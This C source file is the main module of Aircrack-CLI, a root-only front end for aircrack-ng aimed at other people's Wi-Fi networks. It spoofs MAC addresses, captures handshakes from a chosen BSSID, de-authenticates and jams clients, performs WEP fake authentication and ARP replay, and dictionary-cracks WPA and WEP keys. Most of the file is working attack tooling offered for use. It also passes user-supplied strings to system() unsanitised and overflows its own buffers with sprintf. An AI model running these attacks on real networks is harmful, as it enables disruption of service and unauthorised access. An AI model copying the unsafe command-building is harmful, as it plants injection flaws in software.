/**CFile***********************************************************************

   FileName    [aircrack-cli.c]

   PackageName [Aircrack-CLI]

   Synopsis    [Aircrack Command Line Interface - Main module]

   Description [Command Line Interface for Aircrack-ng 
   (credits to Thomas d'Otreppe <tdotreppe@aircrack-ng.org>)]

   Author      [ynad]

   License     [GPLv2, see LICENSE.md]
  
   Revision    [2014-06-19]

******************************************************************************/


#ifndef __linux__
#error Compatible with Linux only!
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>

//Library functions header
#include "lib.h"
//Installer handler header
#include "install.h"

//Module defines
#define MON "mon0"
#define PIDPTH "/tmp/aircli-pid-0"


//Local functions prototypes
static void printHeader();
static int argCheck(int, char **, char, char *, char *);
static void printSyntax(char *, char, char *);
static void installer();
static void printMenu(int, char *, char *, char *, char *, char *, maclist_t);
static int jammer(char *, char *, char *, maclist_t, int);
static char netwPrompt(char *, char *, char *, char *);
static void netwCheck(char, char *, char *, char *);
static int checkExit(char c, char *, char *, char *, char *, char *, char *);
static void stopMonitor(char*, char*);
static void sigHandler(int);

//error variable
//extern int errno;


int main(int argc, char *argv[])
{
	//general variables
	int opz, inst=TRUE, ch;
	maclist_t maclst=NULL;

	//program strings
	char c, id, buff[BUFF], can[BUFF], bssid[BUFF], encr[BUFF], fout[BUFF], manag[BUFF], inmon[BUFF]={MON}, monmac[BUFF], pidpath[BUFF]={PIDPTH}, stdwlan[BUFF], netwstart[BUFF], netwstop[BUFF];
	char startmon[BUFF]={"airmon-ng start"}, stopmon[BUFF]={"airmon-ng stop "};
	char montmp[BUFF]={"xterm 2> /dev/null -T MonitorTemp -e airodump-ng"};
	char scanmon[BUFF]={"xterm 2> /dev/null -T MonitorHandshake -e airodump-ng --bssid"};


	/** INITIAL STAGE **/

	//set signal handler for SIGINT (Ctrl-C)
	signal(SIGINT, sigHandler);

	//print initial message
	printHeader();

	//set environment variables and strings depending on OS type
	id = setDistro(stdwlan, netwstart, netwstop, manag);

	//check arguments and set stuff
	inst = argCheck(argc, argv, id, startmon, stdwlan);

	//check execution rights
	if (getgid() != 0) {
		fprintf(stderr, "Run the program with administrator rights!\n\n");
		return (EXIT_FAILURE);
	}

	//run installer if not skipped
	if (inst == TRUE)
		installer();

	//prompt wheter to stop network-manager
	c = netwPrompt(netwstart, netwstop, stdwlan, manag);


	/** STAGE 1 **/

	fprintf(stdout, "\n\n === Start temporary monitor interface ===\n");
	system(startmon);

	//PID file handling and set inmon
	pidOpen(inmon, pidpath, stdwlan);

	//check monitor, if not found exit
	if (checkMon(inmon) == EXIT_FAILURE)
		checkExit(c, "0", NULL, pidpath, netwstart, stdwlan, manag);

	//monitor MAC changer (use macchanger)
	fprintf(stdout, "Changing MAC of interface \"%s\"...\n", inmon);
	macchanger(inmon, TRUE, NULL);

	//set stop monitor
	strcat(stopmon, inmon);

	//network scanner in detached terminal
	sprintf(montmp, "%s %s &", montmp, inmon);
	system(montmp);

	//data acquisition
	fprintf(stdout, "\nChannel number [-1 if none] (0 to clean-exit):\t");
	do {
		fgets(buff, BUFF-1, stdin);
		sscanf(buff, "%s", can);
		if (sscanf(can, "%d", &ch) != 1)
			ch = -2;
	} while ((ch < -1 || ch > 14) && ch != 0 && fprintf(stdout, "Allowed only channels in range [1-14]:\t"));
	checkExit(c, can, stopmon, pidpath, netwstart, stdwlan, manag);

	fprintf(stdout, "\nTarget BSSID (0 to clean-exit):\t\t\t");
	do {
		fgets(buff, BUFF-1, stdin);
		sscanf(buff, "%s", bssid);
	} while (strcmp(bssid, "0") && checkMac(bssid) == FALSE && fprintf(stdout, "Incorrect address or wrong format:\t"));
	checkExit(c, bssid, stopmon, pidpath, netwstart, stdwlan, manag);

	fprintf(stdout, "\nEncryption [WPA/WEP/OPN] (0 to clean-exit):\t");
	do {
		fgets(buff, BUFF-1, stdin);
		sscanf(buff, "%s", encr);
	} while (strcmp(encr, "0") && (opz=checkEncr(encr)) == FALSE && fprintf(stdout, "Incorrect value or wrong format:\t"));
	checkExit(c, encr, stopmon, pidpath, netwstart, stdwlan, manag);

	//close monitor and remove PID
	stopMonitor(stopmon, pidpath);
	sleep(1);


	/** STAGE 2 **/

	fprintf(stdout, "\n === Start monitor interface ===\n");
	if (ch != -1)
		strcat(startmon, can);
	system(startmon);

	//PID file handling and set inmon
	inmon[strlen(inmon)-1] = '0';
	pidpath[strlen(pidpath)-1] = '0';
	pidOpen(inmon, pidpath, stdwlan);
	//fix monitor number
	stopmon[strlen(stopmon)-1] = inmon[strlen(inmon)-1];

	//check monitor, if not found exit
	if (checkMon(inmon) == EXIT_FAILURE)
		checkExit(c, "0", NULL, pidpath, netwstart, stdwlan, manag);

	//monitor MAC changer (use macchanger)
	fprintf(stdout, "Changing MAC of interface \"%s\"...\n", inmon);

	//get monitor MAC (WEP mode)
	if (opz == WEP) {
		macchanger(inmon, TRUE, monmac);
		//null string in case of error or wrong format: manual input
		if (monmac[0] == '\0' || checkMac(monmac) == FALSE) {
			fprintf(stdout, "\nMAC of monitor interface (0 to clean-exit):\t");
			do {
				fgets(buff, BUFF-1, stdin);
				sscanf(buff, "%s", monmac);
			} while (strcmp(monmac, "0") && checkMac(monmac) == FALSE && fprintf(stdout, "Incorrect address or wrong format:\t"));
			checkExit(c, monmac, stopmon, pidpath, netwstart, stdwlan, manag);
		}
	}
	else {
		macchanger(inmon, TRUE, NULL);
		monmac[0] = '\0';
	}

	//output file
	fprintf(stdout, "\nOutput file (0 to clean-exit):\t");
	fgets(fout, BUFF-1, stdin);
	if (fout[strlen(fout)-1] == '\n')
		fout[strlen(fout)-1] = '\0';
	checkExit(c, fout, stopmon, pidpath, netwstart, stdwlan, manag);

	//scanner handshake, without or with channel
	if (ch == -1)
		sprintf(scanmon, "%s %s -w \"%s\" %s --ignore-negative-one &", scanmon, bssid, fout, inmon);
	else
		sprintf(scanmon, "%s %s -c %s -w \"%s\" %s --ignore-negative-one &", scanmon, bssid, can, fout, inmon);
	system(scanmon);

	//ciclic menu and action chooser
	printMenu(opz, argv[0], fout, bssid, inmon, monmac, maclst);


	/** FINAL STAGE **/
	fprintf(stdout, "Exiting...\n");

	//close monitor, network manager check and memory free
	stopMonitor(stopmon, pidpath);
	netwCheck(c, netwstart, stdwlan, manag);
	freeMem(maclst);

	//greetings
	fprintf(stdout, "\nTerminated.\nData written to file \"%s\". Launch \"./air-cat.sh\" to start cracking.\n\n", fout);

	return (EXIT_SUCCESS);
}


/* Prints program header */
static void printHeader()
{
	fprintf(stdout, "\n =======================================================================\n");
	fprintf(stdout, "    Aircrack-CLI  |  Command Line Interface - v. %s (%s)\n", VERS, BUILD);
	fprintf(stdout, " =======================================================================\n\n");
}


/* Check arguments and set stuff */
static int argCheck(int argc, char **argv, char id, char *startmon, char *stdwlan)
{
	int inst=TRUE;

	//set network interface name and other parameters
	if (argc >= 2) {
		if (!strcmp(argv[1], "N") || !strcmp(argv[1], "n")) {     //installer skipped
			inst = FALSE;
			if (argc == 3) {
				sprintf(startmon, "%s %s ", startmon, argv[2]);
				sprintf(stdwlan, " %s ", argv[2]);
			}
			else
				strcat(startmon, stdwlan);
		}
		else {
			sprintf(startmon, "%s %s ", startmon, argv[1]);
			sprintf(stdwlan, " %s ", argv[1]);
			if (argc == 3 && (!strcmp(argv[2], "N") || !strcmp(argv[2], "n")))
				inst = FALSE;
		}
	}
	else {    //standard interface
		strcat(startmon, stdwlan);	
		printSyntax(argv[0], id, stdwlan);
	}
	return inst;
}


/* Prints program syntax */
static void printSyntax(char *argv0, char id, char *stdwlan)
{
	fprintf(stdout, "\nSyntax: ");	
	if (id == 'u')         //Debian-based
		fprintf(stdout, "sudo ");
	else if (id == 'y')    //RedHat-based
		fprintf(stdout, "su -c \"");
	else    //others
		fprintf(stdout, "su -c \"");
	fprintf(stdout, "%s [N] [WLAN-IF]", argv0);
	if (id != 'u')
		fprintf(stdout, "\"");
	fprintf(stdout, "\nOptional parameters:\n\t[N]\t    skips installation\n\t[WLAN-IF]   specifies wireless interface (default \"%s\")\n\n", stdwlan);
}


/* Installer client */
static void installer()
{
	char c=0, buff[BUFF];

	//check program updates
	fprintf(stdout, "\nDo you want to check for available updates? (requires internet connection!)  [Y-N]\n");
	do {
		fgets(buff, BUFF-1, stdin);
		sscanf(buff, "%c", &c);
		c = toupper(c);
	} while (c != 'Y' && c != 'N' && fprintf(stdout, "Type only [Y-N]\n"));
	if (c == 'Y')
		checkVersion();
	c = '0';

	//dependencies
	fprintf(stdout, "\nInstall requested dependencies to run this program?  [Y-N]\n");
	do {
		fgets(buff, BUFF-1, stdin);
		sscanf(buff, "%c", &c);
		c = toupper(c);
	} while (c != 'Y' && c != 'N' && fprintf(stdout, "Type only [Y-N]\n"));
	if (c == 'Y')
		if (depInstall())
			fprintf(stdout, "Attention: without all dependencies this program may not work properly!\n\n");
	c = '0';

	//aircrack-ng
	fprintf(stdout, "\nDownload and install \"Aircrack-ng\"?  [Y-N]\n");
	do {
		fgets(buff, BUFF-1, stdin);
		sscanf(buff, "%c", &c);
		c = toupper(c);
	} while (c != 'Y' && c != 'N' && fprintf(stdout, "Type only [Y-N]\n"));
	if (c == 'Y')
		if (akngInstall())
			fprintf(stdout, "Attention: \"Aircrack-ng\" NOT installed!\n\n");
}


/* Ciclic print menu and exec actions */
static void printMenu(int mode, char *argv0, char *fout, char *bssid, char *inmon, char *monmac, maclist_t maclst)
{
	int opz = -1;
	char dict[BUFF], buff[BUFF];

	//action menu
	do {
		fprintf(stdout, "\n\nChoose an action:\n=================\n");
		fprintf(stdout, "\t%2d. De-authenticate client(s)\n\t%2d. Jammer (MAC list)\n\t%2d. Jammer (broadcast)\n", 1, 2, 3);
		if (mode == WPA) {
			fprintf(stdout, "\t%2d. Start cracking on current acquired packets (WPA)\n", 4);
		}
		else if (mode == WEP) {
			fprintf(stdout, "\t%2d. Fake authentication (single)\n\t%2d. Fake authentication (keep-alive)\n"
					"\t%2d. ARP request replay mode\n\t%2d. Interactive packet replay\n"
					"\t%2d. Start cracking on current acquired packets (WEP - PTW method)\n"
					"\t%2d. Start cracking on current acquired packets (WEP - FMS/Korek method)\n", 4, 5, 6, 7, 8,9);
		}
		fprintf(stdout, "\t%2d. Stop scanner\n", 0);
		do
			fgets(buff, BUFF-1, stdin);
		while (sscanf(buff, "%d", &opz) != 1 && fprintf(stdout, "Type only integers\n"));

		switch (opz) {
		case 1:
			fprintf(stdout, "De-auth client(s)...\n");
			maclst = deauthClient(bssid, inmon, maclst);
			break;
		case 2:
			fprintf(stdout, "Jammer (list mode)...\n");
			jammer(argv0, bssid, inmon, maclst, 1);
			break;
		case 3:
			fprintf(stdout, "Jammer (broadcast mode)...\n");
			jammer(argv0, bssid, inmon, maclst, 2);
			break;
		case 4:
			if (mode == WPA) {
				fprintf(stdout, "\nPath to dictionary for bruteforce attack:\t");
				fgets(dict, BUFF-1, stdin);
				if (dict[strlen(dict)-1] == '\n')
					dict[strlen(dict)-1] = '\0';
				fprintf(stdout, "Launching WPA crack...\n");
				packCrack(fout, dict, 1);
			}
			else if (mode == WEP) {
				fprintf(stdout, "Running fake authentication (single)...\n\n");
				fakeAuth(bssid, inmon, monmac, 1);
			}
			else 
				fprintf(stdout, "\nError: unexpected option!\n");
			break;
		case 5:
			if (mode == WEP) {
				fprintf(stdout, "Running fake authentication (keep-alive)...\n");
				fakeAuth(bssid, inmon, monmac, 2);
			}
			else 
				fprintf(stdout, "\nError: unexpected option!\n");
			break;
		case 6:
			if (mode == WEP) {
				fprintf(stdout, "Running ARP request replay...\n");
				ARPreqReplay(bssid, inmon, monmac);
			}
			else 
				fprintf(stdout, "\nError: unexpected option!\n");
			break;
		case 7:
			if (mode == WEP) {
				fprintf(stdout, "Running interactive packet replay...\n");
				interReplay(bssid, inmon);
			}
			else 
				fprintf(stdout, "\nError: unexpected option!\n");
			break;			
			break;
		case 8:
			if (mode == WEP) {
				fprintf(stdout, "Launching WEP crack (PTW method)...\n");
				packCrack(fout, NULL, 2);
			}
			else 
				fprintf(stdout, "\nError: unexpected option!\n");
			break;
		case 9:
			if (mode == WEP) {
				fprintf(stdout, "Launching WEP crack (FMS/Korek method)...\n");
				packCrack(fout, NULL, 3);
			}
			else 
				fprintf(stdout, "\nError: unexpected option!\n");
			break;
		case 0:
			break;
		default:
			fprintf(stdout, "\nError: unexpected option!\n");
		}
	} while (opz != 0);
}


/* Interface to AirJammer */
static int jammer(char *argv0, char *bssid, char *inmon, maclist_t maclst, int flag)
{
	char cmd[BUFF], path[BUFF], argvz[BUFF], list[]={"/tmp/maclist.txt"};
	int i, stop=0;

	//clear error value
	errno = 0;

	if (flag == 1) {
		if (maclst == NULL) {
			fprintf(stderr, "\nError: MAC list is still empty!\n");
			return (EXIT_FAILURE);
		}
		if (fprintMaclist(maclst, list) == EXIT_FAILURE) {
			return (EXIT_FAILURE);
		}
	}
	
	if (getcwd(path, BUFF) == NULL) {
		fprintf(stderr, "\nError reading current path: %s\n", strerror(errno));
		return (EXIT_FAILURE);
	}
	//use a copy of argv[0], to not modify it
	strcpy(argvz, argv0);

	//calculate path of AirJammer executable
	for (i=strlen(argvz)-1; i>0 && !stop; i--) {
		if (argvz[i] == '/') {
			argvz[i] = '\0';
			stop = 1;
		}
	}
	if (flag == 2)
		sprintf(cmd, "xterm 2> /dev/null -T AirJammer -e %s/%s/airjammer.bin %s %s &", path, argvz, bssid, inmon);
	else
		sprintf(cmd, "xterm 2> /dev/null -T AirJammer -e %s/%s/airjammer.bin %s %s %s &", path, argvz, bssid, inmon, list);
	system(cmd);

	return (EXIT_SUCCESS);
}


/* Prompt whether to stop network manager */
static char netwPrompt(char *netwstart, char *netwstop, char *stdwlan, char *manag)
{
	char c, tmp[BUFF], newman[BUFF]={"null"}, *ptr;
	FILE *fp;

	//clear error value
	errno = 0;

	c = '0';
	//stop potentially unwanted processes
	fprintf(stdout, "\nDo you want to stop \"%s\" (E to input different manager)?  [Y-N]\n", manag);
	do {
		fgets(tmp, BUFF-1, stdin);
		sscanf(tmp, "%c", &c);
		c = toupper(c);
	} while (c != 'Y' && c != 'N' && c != 'E' && fprintf(stdout, "Type only [Y-N]\n"));

	//edit actual network manager
	if (c == 'E') {
		fprintf(stdout, "Input new manager name (\"null\" or empty if none):\t");
		fgets(tmp, BUFF-1, stdin);
		sscanf(tmp, "%s", newman);
		ptr = replace_str(netwstart, manag, newman);
		strcpy(netwstart, ptr);
		ptr = replace_str(netwstop, manag, newman);
		strcpy(netwstop, ptr);
		strcpy(manag, newman);
		c = 'Y';
	}
	//in case of Y or E, stop network manager and change MAC of stdwlan
	if (c == 'Y') {
		if (access(AIRNETW, F_OK) == 0) {
			fprintf(stdout, "\"%s\" is already stopped.\n", manag);
		}
		else {
			//if manag is "null" just change MAC
			if (strcmp(manag, "null") != 0) {
				fprintf(stdout, "Stopping \"%s\"...\n", manag);
				system(netwstop);	
			}
			if ((fp = fopen(AIRNETW, "w")) == NULL)
				fprintf(stderr, "Warning: Unable to write %s ID file \"%s\" (%s), this may cause problems running multiple instances of this program!\n\n", manag, AIRNETW, strerror(errno));
			else {
				fprintf(fp, "%s", manag);
				fclose(fp);
			}
		}
		fprintf(stdout, "\nChanging MAC of interface \"%s\"...\n", stdwlan);
		macchanger(stdwlan, TRUE, NULL);
	}
	return c;
}


/* Restart network manager if stopped */
static void netwCheck(char c, char *netwstart, char *stdwlan, char *manag)
{
	char pidpath[20]={PIDPTH};
	int i, flag=TRUE;
	FILE *fp;

	//clear error value
	errno = 0;

	//check for program ID files
	if (access(AIRNETW, F_OK) == 0) {
		flag = FALSE;
		for (i=0; i<10 && flag == FALSE; i++) {
			pidpath[strlen(pidpath)-1] = '0'+i;
			if (access(pidpath, F_OK) == 0)
				flag = TRUE;
		}
		//if at least one is found
		if (flag == TRUE) {
			if ((fp = fopen(pidpath, "r")) != NULL) {
				if (fgets(pidpath, 20, fp) != NULL) {
					if (pidpath[strlen(pidpath)-1] == '\n')
						pidpath[strlen(pidpath)-1] = '\0';
					if (strcmp(stdwlan, pidpath) != 0) {
						fprintf(stdout, "\nRestoring permanent MAC of interface \"%s\"...\n", stdwlan);
						macchanger(stdwlan, FALSE, NULL);
					}
				}
				fclose(fp);
			fprintf(stdout, "\nOther sessions of Aircrack-CLI running, restart of \"%s\" skipped.\n\n", manag);
			}
			return;
		}
		//compare network manager name from arguments to the one written to file
		if ((fp = fopen(AIRNETW, "r")) == NULL)
			fprintf(stderr, "Warning: Unable to open %s ID file \"%s\": %s\n", manag, AIRNETW, strerror(errno));
		else {
			if (fscanf(fp, "%s", pidpath) == 1)
				if (strcmp(manag, pidpath) != 0)
					strcpy(manag, pidpath);
			fclose(fp);
		}
	}
	if (c == 'Y' || flag == FALSE) {
		fprintf(stdout, "\nRestoring permanent MAC of interface \"%s\"...\n", stdwlan);
		macchanger(stdwlan, FALSE, NULL);
		//if manag is "null" restore interface without restarting any service
		if (strcmp(manag, "null") == 0) {
			sprintf(pidpath, "ifconfig %s up", stdwlan);
			system(pidpath);
		}
		else {
			fprintf(stdout, "\nRestarting \"%s\"...\n", manag);
			system(netwstart);
		}
		sprintf(pidpath, "rm -f %s", AIRNETW);
		system(pidpath);
		fprintf(stdout, "\n");
	}
}


/* Stops monitor interface and removes PID file */
static void stopMonitor(char *stopmon, char *pidpath)
{
	char clean[25]={"rm -f "};

	if (stopmon != NULL)
		system(stopmon);
	//remove PID file
	strcat(clean, pidpath);
	system(clean);
}


/* Check wheter to clean-exit when given "-1" string */
static int checkExit(char c, char *string, char *stopmon, char *pidpath, char *netwstart, char *stdwlan, char *manag)
{
	if (!strcmp(string, "0")) {
		fprintf(stdout, "Exiting...\n");
		stopMonitor(stopmon, pidpath);
		netwCheck(c, netwstart, stdwlan, manag);
		fprintf(stdout, "\nTerminated.\n\n");
		exit(EXIT_FAILURE);
	}
	return (EXIT_SUCCESS);
}


/* Signal handler */
static void sigHandler(int sig)
{
	if (sig == SIGINT)
		fprintf(stderr, "\nReceived signal SIGINT (%d): exiting.\n", sig);
	else
		fprintf(stderr, "\nReceived signal %d: exiting.\n", sig);

	//exit
	exit(EXIT_FAILURE);
}

